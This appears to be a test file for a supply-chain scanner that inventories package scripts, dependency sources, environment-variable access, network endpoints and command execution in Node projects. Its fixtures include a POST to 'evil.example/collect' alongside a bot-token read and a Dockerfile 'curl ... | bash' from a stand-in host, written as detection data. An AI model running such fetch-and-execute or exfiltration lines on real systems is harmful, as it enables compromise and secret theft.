import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { buildInventory } from "../src/inventory.js";

describe("buildInventory", () => {
  it("detects package scripts, dependency sources, env access, network calls, filesystem, and commands", async () => {
    const fixture = path.resolve("fixtures/malicious-package");
    const inventory = await buildInventory(fixture);

    expect(inventory.packageScripts).toContainEqual({
      name: "postinstall",
      command: "node src/index.ts",
      filePath: "package.json"
    });
    expect(inventory.dependencySources).toContainEqual({
      source: "github:some-user/suspicious-repo",
      filePath: "package.json"
    });
    expect(inventory.environmentVariables).toContain("TELEGRAM_BOT_TOKEN");
    expect(inventory.networkEndpoints).toContainEqual({
      endpoint: "https://evil.example/collect",
      filePath: "src/index.ts",
      line: 9,
      snippet: 'https.request("https://evil.example/collect", { method: "POST" }).end('
    });
    expect(inventory.commandExecutions.length).toBeGreaterThan(0);
    expect(inventory.filesystemReads.length).toBeGreaterThan(0);
  });

  it("detects literal bracket environment variable access", async () => {
    const fixture = await createProject({
      "src/index.ts": "const token = process.env['BRACKET_TOKEN'];\nconst apiKey = process.env[\"BRACKET_API_KEY\"];\n"
    });

    const inventory = await buildInventory(fixture);

    expect(inventory.environmentVariables).toEqual(["BRACKET_API_KEY", "BRACKET_TOKEN"]);
  });

  it("skips invalid and empty package manifests while scanning other files", async () => {
    const fixture = await createProject({
      "package.json": "{ invalid json",
      "packages/empty/package.json": "",
      "src/index.ts": "const token = process.env.TELEGRAM_BOT_TOKEN;\n"
    });

    const inventory = await buildInventory(fixture);

    expect(inventory.packageScripts).toEqual([]);
    expect(inventory.environmentVariables).toContain("TELEGRAM_BOT_TOKEN");
  });

  it("ignores non-string package script and dependency values", async () => {
    const fixture = await createProject({
      "package.json": JSON.stringify({
        scripts: {
          postinstall: 42,
          prepare: "node prepare.js"
        },
        dependencies: {
          hostile: { source: "github:ignored/value" },
          suspicious: "github:some-user/suspicious-repo"
        },
        devDependencies: ["github:ignored/array"]
      })
    });

    const inventory = await buildInventory(fixture);

    expect(inventory.packageScripts).toEqual([
      { name: "prepare", command: "node prepare.js", filePath: "package.json" }
    ]);
    expect(inventory.dependencySources).toEqual([
      { source: "github:some-user/suspicious-repo", filePath: "package.json" }
    ]);
  });

  it("collects nested package manifests with their file paths", async () => {
    const fixture = await createProject({
      "package.json": JSON.stringify({
        dependencies: {
          root: "github:child/suspicious-repo"
        }
      }),
      "packages/child/package.json": JSON.stringify({
        scripts: {
          postinstall: "node child.js"
        },
        dependencies: {
          child: "github:child/suspicious-repo"
        }
      })
    });

    const inventory = await buildInventory(fixture);

    expect(inventory.packageScripts).toContainEqual({
      name: "postinstall",
      command: "node child.js",
      filePath: "packages/child/package.json"
    });
    expect(inventory.dependencySources).toEqual([
      { source: "github:child/suspicious-repo", filePath: "package.json" },
      { source: "github:child/suspicious-repo", filePath: "packages/child/package.json" }
    ]);
  });

  it("detects optional, peer, and bundle dependency source forms", async () => {
    const fixture = await createProject({
      "package.json": JSON.stringify({
        optionalDependencies: {
          optional: "git://github.com/example/optional.git",
          ignored: 42
        },
        peerDependencies: {
          peer: "ssh://git@github.com/example/peer.git"
        },
        bundleDependencies: {
          bundled: "git@github.com:example/bundled.git"
        },
        bundledDependencies: {
          bundledAlias: "https://github.com/example/bundled-alias.git"
        }
      })
    });

    const inventory = await buildInventory(fixture);

    expect(inventory.dependencySources).toEqual([
      { source: "git://github.com/example/optional.git", filePath: "package.json" },
      { source: "git@github.com:example/bundled.git", filePath: "package.json" },
      { source: "https://github.com/example/bundled-alias.git", filePath: "package.json" },
      { source: "ssh://git@github.com/example/peer.git", filePath: "package.json" }
    ]);
  });

  it("does not inventory symlinked files outside the target tree", async () => {
    const fixture = await createProject({
      "src/index.ts": "const token = process.env.INTERNAL_TOKEN;\n"
    });
    const externalDir = await fs.mkdtemp(path.join(os.tmpdir(), "inventory-external-"));
    const externalFile = path.join(externalDir, "outside.ts");
    await fs.writeFile(
      externalFile,
      "const token = process.env.SYMLINK_ESCAPED_TOKEN;\nfetch('https://symlink.example/collect');\n"
    );

    try {
      await fs.symlink(externalFile, path.join(fixture, "src", "linked.ts"));
    } catch (error) {
      const code = (error as NodeJS.ErrnoException).code;
      if (code === "EPERM" || code === "EACCES" || code === "ENOTSUP") {
        return;
      }
      throw error;
    }

    const inventory = await buildInventory(fixture);

    expect(inventory.files).not.toContain("src/linked.ts");
    expect(inventory.environmentVariables).toContain("INTERNAL_TOKEN");
    expect(inventory.environmentVariables).not.toContain("SYMLINK_ESCAPED_TOKEN");
    expect(inventory.networkEndpoints.map((endpoint) => endpoint.endpoint)).not.toContain("https://symlink.example/collect");
  });

  it("includes Dockerfiles and detects command execution in them", async () => {
    const fixture = await createProject({
      Dockerfile: "RUN curl https://evil.example/install.sh | bash\n",
      "packages/child/Dockerfile": "RUN echo child\n"
    });

    const inventory = await buildInventory(fixture);

    expect(inventory.files).toEqual(expect.arrayContaining(["Dockerfile", "packages/child/Dockerfile"]));
    expect(inventory.commandExecutions).toContainEqual({
      filePath: "Dockerfile",
      line: 1,
      snippet: "RUN curl https://evil.example/install.sh | bash"
    });
  });

  it("detects GitHub workflow files and Electron IPC indicators", async () => {
    const fixture = await createProject({
      ".github/workflows/ci.yml": "name: ci\n",
      "src/main.ts": "contextBridge.exposeInMainWorld('api', {});\n"
    });

    const inventory = await buildInventory(fixture);

    expect(inventory.githubWorkflowFiles).toEqual([".github/workflows/ci.yml"]);
    expect(inventory.electronIpcFiles).toEqual(["src/main.ts"]);
  });

  it("does not treat lockfile resolved tarball URLs as runtime network endpoints", async () => {
    const fixture = await createProject({
      "package-lock.json": JSON.stringify({
        packages: {
          "node_modules/example": {
            resolved: "https://registry.npmjs.org/example/-/example-1.0.0.tgz"
          }
        }
      }),
      "src/index.ts": "fetch('https://api.example.test/collect');\n"
    });

    const inventory = await buildInventory(fixture);

    expect(inventory.networkEndpoints.map((endpoint) => endpoint.endpoint)).toEqual(["https://api.example.test/collect"]);
  });
});

async function createProject(files: Record<string, string>): Promise<string> {
  const rootDir = await fs.mkdtemp(path.join(os.tmpdir(), "inventory-test-"));

  await Promise.all(
    Object.entries(files).map(async ([filePath, content]) => {
      const fullPath = path.join(rootDir, filePath);
      await fs.mkdir(path.dirname(fullPath), { recursive: true });
      await fs.writeFile(fullPath, content);
    })
  );

  return rootDir;
}
